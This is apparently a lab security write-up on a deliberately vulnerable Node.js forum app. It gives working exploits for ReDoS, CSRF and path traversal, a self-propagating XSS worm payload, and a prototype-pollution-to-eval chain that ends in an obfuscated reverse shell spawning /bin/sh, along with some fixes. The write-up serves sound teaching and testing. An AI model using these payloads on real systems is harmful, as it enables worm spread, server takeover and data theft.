
## ReDoS

The application is vulnerable to ReDoS on the `/signup` endpoint. The `validatePassword` middleware takes user input and uses it directly as a regular expression in a `String.prototype.match` call. This means that the string entered as a username will be evaluated as a regular expression. If we simply enter `^(a+)+$` as a username and `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1` as a password, the regex engine used by Node.js will be stuck in a backtracking loop. The time it takes to evaluate this expression scales exponentially with the number of `a`'s in the password. This vulnerability could be mitigated by forbidding the use of special characters in usernames and having that check run as a middleware before the password check. Here is an example:
```javascript
function validateUsername(req, res, next){
    const name = req.body.username;
    const usernameRegex = /[a-zA-Z0-9_\-]/;

    if(!usernameRegex.test(name)){
        req.flash("message","Usernames should only contain the characters A-Z, a-z, 0-9, -, _")
        req.flash("error","Usernames should only contain the characters A-Z, a-z, 0-9, -, _")
        return res.redirect("/register")
    }
    next()
}
```
This will make sure that the username can not be a malicious regular expression, since it only allows for simple regular expressions. Another thing we can do to mitigate this issue is to replace `pass.match` in the validatePassword middleware with `pass.includes`. This aligns better with what the developer was trying to accomplish.
### Is this enough?
To be really sure that you have created a secure authentication system, the first thing you should do is... **DELETE YOUR CODE!!!!** Use something that is known to work. Don't go around saving passwords in plaintext in your own database. Use managed services from trustworthy providers for your authentication.


## XSS

The website uses a CSP (Content Security Policy) which allows the browser to load scripts only from certain sources. 
In theory, this can help prevent XSS attacks. However, even though the CSP is configured in a way that makes it impossible to load scripts from external sources, or even inline in the html, we can still execute code.
By uploading a javascript file as our profile picture, we can create a resource on the website that can be loaded by the browser.

In order to actually run the code then, we need to create a script tag that loads our script from the server. This can be done by creating a post with the following content:

```html
<scr<scriptipt src="http://localhost:3000/images/profileImages/username"></script>
```

This is the payload we uploaded as our profile picture:

```javascript
const {protocol, hostname, port} = window.location

const username = "username"

const postUrl = protocol + "//" + hostname + ":" + port + "/createThread?topic=discussion" 
const changeProfilePictureUrl = protocol + "//" + hostname + ":" + port + "/upload"
const payloadUrl = protocol + "//" + hostname + ":" + port + `/images/profileImages/${username}`

async function propagate(){
    const thisFile = await fetch(payloadUrl);
    const thisFileText = await thisFile.text();
    const myUsername = document.querySelector(".dropdown-toggle").getAttribute("title");
    if(myUsername == username || myUsername == null){
        return;
    }
    const usernameRegex = /(const username = )"([\w\d])"/
    const newPayload = thisFileText.replace(usernameRegex, `$1"${myUsername}"`)
    const formData = new FormData();
    formData.append("avatar", new Blob([newPayload], {type: "text/javascript"}), "payload.js");
    const response = await fetch(changeProfilePictureUrl, {
        method: "POST",
        body: formData
    })

    const newProfilePictureUrl = protocol + "//" + hostname + ":" + port + `/images/profileImages/${myUsername}`

    const xssPayload = `I got some new kicks at the kicks store. Don't know how to post images on here sorry! <scr<scriptipt src="${newProfilePictureUrl}"></script>`

    const createThreadData = `subject=New+kicks&body=${encodeURIComponent(xssPayload)}`

    const postResponse = await fetch(postUrl, {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST",
        body: createThreadData
    })

}

propagate();
```

This payload will change the username in the payload to the username of the user that visits the page. It will then upload the payload as the user's profile picture, and create a post with a script tag that loads the user's profile picture. This will then execute the payload on the user's browser, which will then execute the payload on every user's browser that visits the page.

## CSRF

The website does not have any CSRF protection for its forms. We can easily create a thread on a user's behalf by having them press a button on a website we control.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Epic form website!</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div id="container">
        <h1 id="title">Epic website with a cool button!</h1>
        <!--A form with only hidden fields and a submit button-->
        <form action="http://localhost:3000/createThread?topic=discussion" method="post">
            <!--The hidden fields-->
            <input type="hidden" name="subject" value="You won't believe what happened to me!!!! MUST READ!!!">
            <input type="hidden" name="body" value="I won a free milkshake at McDonald's!!! <scr<scriptipt src='http://localhost:3000/images/profileImages/username'></script>">
            <!--The submit button-->
            <input id="submit_button" type="submit" value="Learn more!">
        </form>
    </div>
</body>
</html>
```

This payload will create a post on the victim's behalf that will execute the payload we uploaded as our profile picture. This can make it look as if the victim is the one posting malicious content, although we still had to upload the profile picture ourselves. We could also have made another user post the payload with another csrf attack.

To mitigate this issue, the web app should use CSRF tokens for its forms.


## Prototype pollution & RCE
To find the prototype pollution bug in the code, We used CodeQL to generate a database of the code. We then used the default javascript suite included in CodeQL to search for vulnerabilities. From the list that was generated, We found the merge bug. In order to then create a working exploit, we had to figure out what sort of request we should send to the server in order to trigger the bug. To figure this out, we logged into the database with MongoDB compass and found the "admin" user in the forumerly/users database. Since the passwords were stored in plaintext, we were able to sign in using the admin credentials as listed in the table. We then found the route on the page with the form pointing to /upload/users. To send a test request, we simply uploaded a JSON file with the contents `[]`. The reason for this was that the code handling the POST request starts with a call to Array.prototype.map, meaning that the request would likely have the correct shape and headers, but the server wouldn't do anything with it.

After figuring out the shape of the request, we were able to get to work with the prototype pollution. After some experimentation and fighting with the fetch api to get the correct headers and body, we were able to upload our first custom user object to be merged on the server. We then started experimenting with prototype pollution. It took some time to figure out that the object we were trying to change was `Object.prototype`. We finally got this to work by sending an object with the following structure:

```javascript
{
    "__proto__": {
        "constructor": {
            "prototype": {
                "payload": "here"
            }
        }
    }
}
```

Which makes sense because any object with no custom class will have a constructor of Object, and the constructor of Object has a prototype property that is the prototype of all objects. This was a bingo, since we could now change the prototype of all objects to whatever we wanted.

Something that we did not need CodeQL to figure out was where we should aim our sights to perform RCE. A quick search through the code revealed an "eval" call in the file `passport.js`, specifically in a snippet of code that was used to create a new user on the fly in the case that an unregistered user signed in. The issue with this was that this it of code was guarded by a conditional statement. However, since we have our prototype pollution, we can simply set this property to true, and we will be able to execute arbitrary code on the server. Here is the most important part of the conditional statement:

```javascript
if (options.userAutoCreateTemplate){
    try {
            const wrapperFunction = `(function() {
              const username = '${username}';
              const passport = '${password}';
              return \`${options.userAutoCreateTemplate}\`;
            })()`
            const newUser = JSON.parse(eval(wrapperFunction))
            ...
    } catch (e) {
       ...
    }
}
```
The final payload we sent to the server for prototype pollution was the following:

```javascript
{
    "__proto__": {
        "constructor": {
            "prototype": {
                "userAutoCreateTemplate": true
            }
        }
    }
}
``` 
This would let us into the code snippet containing the `eval` call. To enter this bit of code, we had to send a POST request to `/login`. We did the same type of investigation here as with the previously mentioned endpoint, by simply logging in and viewing the shape of the request in the network tab. By setting a `username` of `blabla';console.log("Hello, world!");//`, we were able to see that the exploit was really working. At this stage however, the server crashed instantly whenever we did this due to the following error: 
```
MongoServerError: BSON field 'insert.userAutoCreateTemplate' is an unknown field.
    at Connection.onMessage (/home/emil/forumerly/node_modules/mongodb/lib/cmap/connection.js:203:30)
    ...
    at Socket.emit (node:events:513:28)
```
Which seemed to be caused by the prototype pollution. In order to counteract this, we simply executed the following line of code in our RCE payload:
```javascript
delete Object.prototype.userAutoCreateTemplate;
```
We can safely do this because we are already at the place in the code where we wanted to get by using prototype pollution.

The next step was to try and do something useful with this newly found access. Through some means or other, we found a reverse shell payload for Node.js. This was customised for our specific use case and sent to the server. With this, we managed to get a shell on the target machine. Below are outlined the steps in brief, to get a shell on the target machine:

### Stage 1: Prototype pollution
In the file `user.js`, a POST route defined at `/upload/users` allows the user to upload a JSON file containing an array of users. This is likely functionality that was added for testing purposes or for administrator use. The route expects an array of user objects, where each user is either new or already exists in the database. If the user already exists, it will be merged with the existing record from the database. This is done in an unsecure way that allows for prototype pollution. This is the function that merges the user objects:

```javascript
function merge(target, source) {
  Object.keys(source).forEach(key => {
    if (isObject(source[key])) {
      if (!target[key]) {
        target[key] = {};
      }
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  });

  return target;
}
```

By first uploading an empty user object, we can then upload a user object with a prototype property that will be merged with the empty user object. This will allow us to set arbitrary properties on the empty user object. This is the payload we will upload:

```javascript
[{
    "lcUsername": "testuser", 
    "__proto__": {
        "constructor": {
            "prototype": {"userAutoCreateTemplate": true}
        }
    }
}]
```

### Stage 2: Remote Code Execution

`userAutoCreateTemplate` is a property that is used to determine whether or not a user should be created if they do not exist in the database. By setting this property to true, we can create a user with any username we want. This is interesting because the code that is used to create a user contains a vulnerable eval statement without any sanitization. This is the code that is used to create a user:

```javascript
if (options.userAutoCreateTemplate) {
          try {
            const wrapperFunction = `(function() {
              const username = '${username}'; // <-- This is the username we can control
              const passport = '${password}';
              return \`${options.userAutoCreateTemplate}\`;
            })()`
            const newUser = JSON.parse(eval(wrapperFunction))
            // Insert the new username into the database
            mongo.db.collection('users')
              .insertOne(newUser, (err, result) => {
                if (err) {return done(err)} else {
                mongo.db.collection("users").findOne(result.insertedId, (err, result) => {
                  if (err) {return done(err)} else {
                    return done(null, result)
                  }
                })
              }
            });
          } catch (error) {
            console.log(error)
          }
        }
```

Clearly, the only thing we need to do with our username in order to gain the ability to run any code we want on the server is something like this: `username'; console.log('hello world'); //`.

With this said, here is a function that can be run in the browser console to gain a shell on the server:

```javascript
// The parameter i is a debug parameter that is used to make sure we create a new user every time we run the function. 
async function injectPayload(i){
    async function upload(payload){
        const file = new File([payload], "users.json", {type: "application/json"});
        const data = new FormData();
        data.append("upload-users", file);
        const res = await fetch("/upload/users", {
            method: "POST",
            headers: {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    
            },
            body: data
        })
    }
    // Create a user in the database
    const payload1 = 
    `[{
        "lcUsername": "testuser${i}"
    }]`
    
    await upload(payload1).catch(e => console.log(e))
    
    // Update said user in order to execute prototype pollution
    
    const payload2 = 
    `[{
        "lcUsername": "testuser${i}", 
        "__proto__": {
            "constructor": {
                "prototype": {"userAutoCreateTemplate": true}
            }
        }
    }]`
    
    await upload(payload2).catch(e => console.log(e))
    // Reverse shell generated from python script
    const revshell = "eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,56,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,34,108,105,115,116,101,110,105,110,103,32,111,110,32,112,111,114,116,32,34,32,43,32,80,79,82,84,32,43,32,34,92,110,34,41,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,40,41,32,61,62,32,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))"

    const payload3 = new FormData();
    // The code that will be executed on the server
    payload3.append("username", `blabla';
                    console.log("im in");
                    delete Object.prototype.userAutoCreateTemplate;
                    ${revshell};
                    return "{}";//`); // Escape the string to avoid syntax errors
    payload3.append("password", "blabla");

    await fetch("/login", {
        method: "POST",
        body: new URLSearchParams(payload3)
        }).catch((err) => console.log(err));

}
```
Toward the end of the final payload, we can see `delete Object.prototype.userAutoCreateTemplate;`, which was added in order to prevent a crash. MongoDB apparently does not like prototype pollution.

## RCE bonus round: replace the entire website without any effort! (Path traversal)

By creating an account with the name "../../../app.js", any profile picture we upload will overwrite the app.js file, which is the entrypoint of our node.js application. This means that on subsequent runs of the server, our code will be executed instead of the ordinary code. This, paired with the many crashes makes for a devious exploit, since the server owner will restart the server on a crash (probably), and will then run our code. If we are polite hackers, we can patch the vulnerable code, use a bundler like webpack or rollup and upload the entire bundle as `app.js` and the security flaws will be fixed!
### Fixing this bug
Just like with the ReDoS bug, in this specific instance it would have helped to only allow alphanumeric characters in usernames. To be a bit more prudent, we should not store any user generated content on the same machine which the server is running on. We should instead have at least one machine for each concern: One (or more) for databases, one for Node.js, one for file storage. Or just use an S3 bucket like a normal person. Security is a lot more difficult when you have to do it yourself.